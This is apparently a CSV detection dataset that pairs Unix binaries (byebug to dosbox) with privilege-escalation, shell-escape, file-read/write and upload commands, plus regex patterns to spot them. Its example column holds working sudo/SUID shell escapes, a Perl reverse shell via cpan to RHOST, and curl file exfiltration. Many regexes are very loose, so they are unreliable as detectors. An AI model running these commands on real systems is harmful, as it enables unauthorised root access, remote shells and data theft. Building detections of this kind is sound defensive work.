"Name","Function","ExampleCode","RegexStrictV8","Notes"
"byebug","limited-suid","echo 'system(""/bin/sh"")' > $TF
./byebug $TF
continue","(?i)\b(?:\S*/)?echo\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh",""
"byebug","sudo","echo 'system(""/bin/sh"")' > $TF
sudo byebug $TF
continue","(?i)\b(?:\S*/)?echo\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh",""
"bzip2","file-read","bzip2 -c $LFILE | bzip2 -d","(?i)\b(?:\S*/)?bzip2\b.*\-c",""
"bzip2","suid","./bzip2 -c $LFILE | bzip2 -d","(?i)\b(?:\S*/)?bzip2\b.*\-c",""
"bzip2","sudo","sudo bzip2 -c $LFILE | bzip2 -d","(?i)\b(?:\S*/)?sudo\b.*\-c",""
"c89","file-read","c89 -x c -E ""$LFILE""","(?i)\b(?:\S*/)?c89\b.*(?:""[^""]+""|\'[^\']+\')",""
"c89","file-write","c89 -xc /dev/null -o $LFILE","(?i)\b(?:\S*/)?c89\b.*.+",""
"c89","shell","c89 -wrapper /bin/sh,-s .","(?i)\b(?:\S*/)?c89\b.*/bin/sh",""
"c89","sudo","sudo c89 -wrapper /bin/sh,-s .","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"c99","file-read","c99 -x c -E ""$LFILE""","(?i)\b(?:\S*/)?c99\b.*(?:""[^""]+""|\'[^\']+\')",""
"c99","file-write","c99 -xc /dev/null -o $LFILE","(?i)\b(?:\S*/)?c99\b.*.+",""
"c99","shell","c99 -wrapper /bin/sh,-s .","(?i)\b(?:\S*/)?c99\b.*/bin/sh",""
"c99","sudo","sudo c99 -wrapper /bin/sh,-s .","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"cabal","shell","cabal exec -- /bin/sh","(?i)\b(?:\S*/)?cabal\b.*/bin/sh",""
"cabal","suid","./cabal exec -- /bin/sh -p","(?i)\b(?:\S*/)?cabal\b.*/bin/sh",""
"cabal","sudo","sudo cabal exec -- /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"cancel","file-upload","cancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT","(?i)\b(?:\S*/)?cancel\b.*(?:""[^""]+""|\'[^\']+\')",""
"capsh","shell","capsh --","(?i)\b(?:\S*/)?capsh\b.*.+",""
"capsh","suid","./capsh --gid=0 --uid=0 --","(?i)\b(?:\S*/)?capsh\b.*.+",""
"capsh","sudo","sudo capsh --","(?i)\b(?:\S*/)?sudo\b.*.+",""
"cat","file-read","cat ""$LFILE""","(?i)\b(?:\S*/)?cat\b.*(?:""[^""]+""|\'[^\']+\')",""
"cat","suid","./cat ""$LFILE""","(?i)\b(?:\S*/)?cat\b.*(?:""[^""]+""|\'[^\']+\')",""
"cat","sudo","sudo cat ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"cdist","shell","cdist shell -s /bin/sh","(?i)\b(?:\S*/)?cdist\b.*/bin/sh",""
"cdist","sudo","sudo cdist shell -s /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"certbot","shell","certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'","(?i)\b(?:\S*/)?certbot\b.*/bin/sh.*\-c.*\-r",""
"certbot","sudo","sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'","(?i)\b(?:\S*/)?sudo\b.*/bin/sh.*\-c.*\-r",""
"check_by_ssh","shell","check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx","(?i)\b(?:\S*/)?check_by_ssh\b.*/bin/sh.*\-c",""
"check_by_ssh","sudo","sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx","(?i)\b(?:\S*/)?sudo\b.*/bin/sh.*\-c",""
"check_cups","file-read","check_cups --extra-opts=@$LFILE","(?i)\b(?:\S*/)?check_cups\b.*.+",""
"check_cups","sudo","sudo check_cups --extra-opts=@$LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"check_log","file-read","check_log -F $LFILE -O $OUTPUT
cat $OUTPUT","(?i)\b(?:\S*/)?check_log\b.*.+",""
"check_log","file-write","check_log -F $INPUT -O $LFILE","(?i)\b(?:\S*/)?check_log\b.*.+",""
"check_log","sudo","sudo check_log -F $INPUT -O $LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"check_memory","file-read","check_memory --extra-opts=@$LFILE","(?i)\b(?:\S*/)?check_memory\b.*.+",""
"check_memory","sudo","sudo check_memory --extra-opts=@$LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"check_raid","file-read","check_raid --extra-opts=@$LFILE","(?i)\b(?:\S*/)?check_raid\b.*.+",""
"check_raid","sudo","sudo check_raid --extra-opts=@$LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"check_ssl_cert","command","echo ""$COMMAND | tee $OUTPUT"" > $TF
chmod +x $TF
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT","(?i)\b(?:\S*/)?echo\b.*\-c",""
"check_ssl_cert","sudo","echo ""$COMMAND | tee $OUTPUT"" > $TF
chmod +x $TF
umask 022
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT","(?i)\b(?:\S*/)?echo\b.*\-c",""
"check_statusfile","file-read","check_statusfile $LFILE","(?i)\b(?:\S*/)?check_statusfile\b.*.+",""
"check_statusfile","sudo","sudo check_statusfile $LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"chmod","suid","./chmod 6777 $LFILE","(?i)\b(?:\S*/)?chmod\b.*.+",""
"chmod","sudo","sudo chmod 6777 $LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"choom","shell","choom -n 0 /bin/sh","(?i)\b(?:\S*/)?choom\b.*/bin/sh",""
"choom","suid","./choom -n 0 -- /bin/sh -p","(?i)\b(?:\S*/)?choom\b.*/bin/sh",""
"choom","sudo","sudo choom -n 0 /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"chown","suid","./chown $(id -un):$(id -gn) $LFILE","(?i)\b(?:\S*/)?chown\b.*.+",""
"chown","sudo","sudo chown $(id -un):$(id -gn) $LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"chroot","suid","./chroot / /bin/sh -p","(?i)\b(?:\S*/)?chroot\b.*/bin/sh",""
"chroot","sudo","sudo chroot /","(?i)\b(?:\S*/)?sudo\b.*.+",""
"clamscan","file-read","touch $TF/empty.yara
clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'","(?i)\b(?:\S*/)?touch\b.*(?:""[^""]+""|\'[^\']+\')",""
"clamscan","suid","touch $TF/empty.yara
./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'","(?i)\b(?:\S*/)?touch\b.*(?:""[^""]+""|\'[^\']+\')",""
"clamscan","sudo","touch $TF/empty.yara
sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'","(?i)\b(?:\S*/)?touch\b.*(?:""[^""]+""|\'[^\']+\')",""
"cmp","file-read","cmp $LFILE /dev/zero -b -l","(?i)\b(?:\S*/)?cmp\b.*.+",""
"cmp","suid","./cmp $LFILE /dev/zero -b -l","(?i)\b(?:\S*/)?cmp\b.*.+",""
"cmp","sudo","sudo cmp $LFILE /dev/zero -b -l","(?i)\b(?:\S*/)?sudo\b.*.+",""
"cobc","shell","echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
cobc -xFj --frelax-syntax-checks $TF/x","(?i)\b(?:\S*/)?echo\b.*/bin/sh.*\-c",""
"cobc","sudo","echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
sudo cobc -xFj --frelax-syntax-checks $TF/x","(?i)\b(?:\S*/)?echo\b.*/bin/sh.*\-c",""
"column","file-read","column $LFILE","(?i)\b(?:\S*/)?column\b.*.+",""
"column","suid","./column $LFILE","(?i)\b(?:\S*/)?column\b.*.+",""
"column","sudo","sudo column $LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"comm","file-read","comm $LFILE /dev/null 2>/dev/null","(?i)\b(?:\S*/)?comm\b.*.+",""
"comm","suid","comm $LFILE /dev/null 2>/dev/null","(?i)\b(?:\S*/)?comm\b.*.+",""
"comm","sudo","sudo comm $LFILE /dev/null 2>/dev/null","(?i)\b(?:\S*/)?sudo\b.*.+",""
"composer","shell","echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
composer --working-dir=$TF run-script x","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"composer","limited-suid","echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
./composer --working-dir=$TF run-script x","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"composer","sudo","echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"cowsay","shell","echo 'exec ""/bin/sh"";' >$TF
cowsay -f $TF x","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"cowsay","sudo","echo 'exec ""/bin/sh"";' >$TF
sudo cowsay -f $TF x","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"cowthink","shell","echo 'exec ""/bin/sh"";' >$TF
cowthink -f $TF x","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"cowthink","sudo","echo 'exec ""/bin/sh"";' >$TF
sudo cowthink -f $TF x","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"cp","file-read","cp ""$LFILE"" /dev/stdout","(?i)\b(?:\S*/)?cp\b.*(?:""[^""]+""|\'[^\']+\')",""
"cp","file-write","echo ""DATA"" | cp /dev/stdin ""$LFILE""","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"cp","suid","echo ""DATA"" | ./cp /dev/stdin ""$LFILE""","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"cp","suid","echo ""DATA"" > $TF
./cp $TF $LFILE","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"cp","suid","./cp --attributes-only --preserve=all ./cp ""$LFILE""","(?i)\b(?:\S*/)?cp\b.*(?:""[^""]+""|\'[^\']+\')",""
"cp","sudo","echo ""DATA"" | sudo cp /dev/stdin ""$LFILE""","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"cp","sudo","echo ""DATA"" > $TF
sudo cp $TF $LFILE","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"cp","sudo","sudo cp /bin/sh /bin/cp
sudo cp","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"cpan","shell","cpan
! exec '/bin/bash'","(?i)\b(?:\S*/)?cpan\b.*/bin/bash",""
"cpan","reverse-shell","cpan
! use Socket; my $i=""$ENV{RHOST}""; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp"")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S""); open(STDOUT,"">&S""); open(STDERR,"">&S""); exec(""/bin/sh -i"");};","(?i)\b(?:\S*/)?cpan\b.*socket\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*if\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*open\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*open\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*open\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*exec\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh",""
"cpan","file-upload","cpan
! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();","(?i)\b(?:\S*/)?cpan\b.*new\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*run\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"cpan","file-download","cpan
! use File::Fetch; my $file = (File::Fetch->new(uri => ""$ENV{URL}""))->fetch();","(?i)\b(?:\S*/)?cpan\b.*new\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*fetch\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"cpan","sudo","sudo cpan
! exec '/bin/bash'","(?i)\b(?:\S*/)?sudo\b.*/bin/bash",""
"cpio","shell","echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:","(?i)\b(?:\S*/)?echo\b.*/bin/sh.*\-c.*\-r",""
"cpio","file-read","echo ""$LFILE"" | cpio -o","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"cpio","file-read","echo ""$LFILE"" | cpio -dp $TF
cat ""$TF/$LFILE""","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"cpio","file-write","echo DATA >$LFILE
echo $LFILE | cpio -up $LDIR","(?i)\b(?:\S*/)?echo\b.*.+",""
"cpio","suid","echo ""$LFILE"" | ./cpio -R $UID -dp $TF
cat ""$TF/$LFILE""","(?i)\b(?:\S*/)?echo\b.*\-r",""
"cpio","suid","echo DATA >$LFILE
echo $LFILE | ./cpio -R 0:0 -p $LDIR","(?i)\b(?:\S*/)?echo\b.*\-r",""
"cpio","sudo","echo '/bin/sh </dev/tty >/dev/tty' >localhost
sudo cpio -o --rsh-command /bin/sh -F localhost:","(?i)\b(?:\S*/)?echo\b.*/bin/sh.*\-c.*\-r",""
"cpio","sudo","echo ""$LFILE"" | sudo cpio -R $UID -dp $TF
cat ""$TF/$LFILE""","(?i)\b(?:\S*/)?echo\b.*\-r",""
"cpio","sudo","echo DATA >$LFILE
echo $LFILE | sudo cpio -R 0:0 -p $LDIR","(?i)\b(?:\S*/)?echo\b.*\-r",""
"cpulimit","shell","cpulimit -l 100 -f /bin/sh","(?i)\b(?:\S*/)?cpulimit\b.*/bin/sh",""
"cpulimit","suid","./cpulimit -l 100 -f -- /bin/sh -p","(?i)\b(?:\S*/)?cpulimit\b.*/bin/sh",""
"cpulimit","sudo","sudo cpulimit -l 100 -f /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"crash","shell","crash -h
!sh","(?i)\b(?:\S*/)?crash\b.*.+",""
"crash","command","CRASHPAGER=""$COMMAND"" crash -h","(?i)\b(?:\S*/)?CRASHPAGER\b.*(?:""[^""]+""|\'[^\']+\')",""
"crash","sudo","sudo crash -h
!sh","(?i)\b(?:\S*/)?sudo\b.*.+",""
"crontab","command","crontab -e","(?i)\b(?:\S*/)?crontab\b.*.+",""
"crontab","sudo","sudo crontab -e","(?i)\b(?:\S*/)?sudo\b.*.+",""
"csh","shell","csh","(?i)\b(?:\S*/)?csh\b.*.+",""
"csh","file-write","ash -c 'echo DATA > $LFILE'","(?i)\b(?:\S*/)?ash\b.*\-c",""
"csh","suid","./csh -b","(?i)\b(?:\S*/)?csh\b.*.+",""
"csh","sudo","sudo csh","(?i)\b(?:\S*/)?sudo\b.*.+",""
"csplit","file-read","csplit $LFILE 1
cat xx01","(?i)\b(?:\S*/)?csplit\b.*.+",""
"csplit","file-write","echo ""DATA"" > $TF
LFILE=file_to_write
csplit -z -b ""%d$LFILE"" $TF 1","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"csplit","suid","csplit $LFILE 1
cat xx01","(?i)\b(?:\S*/)?csplit\b.*.+",""
"csplit","sudo","csplit $LFILE 1
cat xx01","(?i)\b(?:\S*/)?csplit\b.*.+",""
"csvtool","file-read","csvtool trim t $LFILE","(?i)\b(?:\S*/)?csvtool\b.*.+",""
"csvtool","file-write","echo DATA > $TF
csvtool trim t $TF -o $LFILE","(?i)\b(?:\S*/)?echo\b.*.+",""
"csvtool","suid","./csvtool trim t $LFILE","(?i)\b(?:\S*/)?csvtool\b.*.+",""
"csvtool","shell","csvtool call '/bin/sh;false' /etc/passwd","(?i)\b(?:\S*/)?csvtool\b.*/bin/sh",""
"csvtool","sudo","sudo csvtool call '/bin/sh;false' /etc/passwd","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"cupsfilter","file-read","cupsfilter -i application/octet-stream -m application/octet-stream $LFILE","(?i)\b(?:\S*/)?cupsfilter\b.*.+",""
"cupsfilter","sudo","sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"cupsfilter","suid","./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE","(?i)\b(?:\S*/)?cupsfilter\b.*.+",""
"curl","file-upload","curl -X POST -d ""@$LFILE"" $URL","(?i)\b(?:\S*/)?curl\b.*(?:""[^""]+""|\'[^\']+\')",""
"curl","file-download","curl $URL -o $LFILE","(?i)\b(?:\S*/)?curl\b.*.+",""
"curl","file-read","curl file://$LFILE","(?i)\b(?:\S*/)?curl\b.*.+",""
"curl","file-write","echo DATA >$TF
curl ""file://$TF"" -o ""$LFILE""","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"curl","suid","./curl $URL -o $LFILE","(?i)\b(?:\S*/)?curl\b.*.+",""
"curl","sudo","sudo curl $URL -o $LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"cut","file-read","cut -d """" -f1 ""$LFILE""","(?i)\b(?:\S*/)?cut\b.*(?:""[^""]+""|\'[^\']+\')",""
"cut","suid","./cut -d """" -f1 ""$LFILE""","(?i)\b(?:\S*/)?cut\b.*(?:""[^""]+""|\'[^\']+\')",""
"cut","sudo","sudo cut -d """" -f1 ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"dash","shell","dash","(?i)\b(?:\S*/)?dash\b.*.+",""
"dash","file-write","dash -c 'echo DATA > $LFILE'","(?i)\b(?:\S*/)?dash\b.*\-c",""
"dash","suid","./dash -p","(?i)\b(?:\S*/)?dash\b.*.+",""
"dash","sudo","sudo dash","(?i)\b(?:\S*/)?sudo\b.*.+",""
"date","file-read","date -f $LFILE","(?i)\b(?:\S*/)?date\b.*.+",""
"date","suid","./date -f $LFILE","(?i)\b(?:\S*/)?date\b.*.+",""
"date","sudo","sudo date -f $LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"dc","shell","dc -e '!/bin/sh'","(?i)\b(?:\S*/)?dc\b.*/bin/sh",""
"dc","sudo","sudo dc -e '!/bin/sh'","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"dc","limited-suid","./dc -e '!/bin/sh'","(?i)\b(?:\S*/)?dc\b.*/bin/sh",""
"dd","file-write","echo ""DATA"" | dd of=$LFILE","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"dd","file-read","dd if=$LFILE","(?i)\b(?:\S*/)?dd\b.*.+",""
"dd","suid","echo ""data"" | ./dd of=$LFILE","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"dd","sudo","echo ""data"" | sudo dd of=$LFILE","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"debugfs","shell","debugfs
!/bin/sh","(?i)\b(?:\S*/)?debugfs\b.*/bin/sh",""
"debugfs","suid","./debugfs
!/bin/sh","(?i)\b(?:\S*/)?debugfs\b.*/bin/sh",""
"debugfs","sudo","sudo debugfs
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"dialog","file-read","dialog --textbox ""$LFILE"" 0 0","(?i)\b(?:\S*/)?dialog\b.*(?:""[^""]+""|\'[^\']+\')",""
"dialog","suid","./dialog --textbox ""$LFILE"" 0 0","(?i)\b(?:\S*/)?dialog\b.*(?:""[^""]+""|\'[^\']+\')",""
"dialog","sudo","sudo dialog --textbox ""$LFILE"" 0 0","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"diff","file-read","diff --line-format=%L /dev/null $LFILE","(?i)\b(?:\S*/)?diff\b.*.+",""
"diff","file-read","diff --recursive $TF $LFOLDER","(?i)\b(?:\S*/)?diff\b.*\-r",""
"diff","suid","./diff --line-format=%L /dev/null $LFILE","(?i)\b(?:\S*/)?diff\b.*.+",""
"diff","sudo","sudo diff --line-format=%L /dev/null $LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"dig","file-read","dig -f $LFILE","(?i)\b(?:\S*/)?dig\b.*.+",""
"dig","sudo","sudo dig -f $LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"dig","suid","./dig -f $LFILE","(?i)\b(?:\S*/)?dig\b.*.+",""
"distcc","shell","distcc /bin/sh","(?i)\b(?:\S*/)?distcc\b.*/bin/sh",""
"distcc","suid","./distcc /bin/sh -p","(?i)\b(?:\S*/)?distcc\b.*/bin/sh",""
"distcc","sudo","sudo distcc /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"dmesg","file-read","dmesg -rF ""$LFILE""","(?i)\b(?:\S*/)?dmesg\b.*\-r",""
"dmesg","shell","dmesg -H
!/bin/sh","(?i)\b(?:\S*/)?dmesg\b.*/bin/sh",""
"dmesg","sudo","sudo dmesg -H
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"dmidecode","sudo","sudo dmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"dmsetup","sudo","sudo dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
sudo dmsetup ls --exec '/bin/sh -s'","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"dmsetup","suid","./dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
./dmsetup ls --exec '/bin/sh -p -s'","(?i)\b(?:\S*/)?dmsetup\b.*/bin/sh",""
"dnf","sudo","sudo dnf install -y x-1.0-1.noarch.rpm","(?i)\b(?:\S*/)?sudo\b.*.+",""
"docker","shell","docker run -v /:/mnt --rm -it alpine chroot /mnt sh","(?i)\b(?:\S*/)?docker\b.*\-r",""
"docker","file-write","echo ""DATA"" > $TF
docker cp $TF $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF file_to_write","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"docker","file-read","docker cp file_to_read $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF $TF
cat $TF","(?i)\b(?:\S*/)?docker\b.*.+",""
"docker","sudo","sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh","(?i)\b(?:\S*/)?sudo\b.*\-r",""
"docker","suid","./docker run -v /:/mnt --rm -it alpine chroot /mnt sh","(?i)\b(?:\S*/)?docker\b.*\-r",""
"dos2unix","file-write","dos2unix -f -n ""$LFILE1"" ""$LFILE2""","(?i)\b(?:\S*/)?dos2unix\b.*(?:""[^""]+""|\'[^\']+\')",""
"dosbox","file-read","dosbox -c 'mount c /' -c ""type c:$LFILE""","(?i)\b(?:\S*/)?dosbox\b.*\-c",""
"dosbox","file-read","dosbox -c 'mount c /' -c ""copy c:$LFILE c:\tmp\output"" -c exit
cat '/tmp/OUTPUT'","(?i)\b(?:\S*/)?dosbox\b.*\-c",""
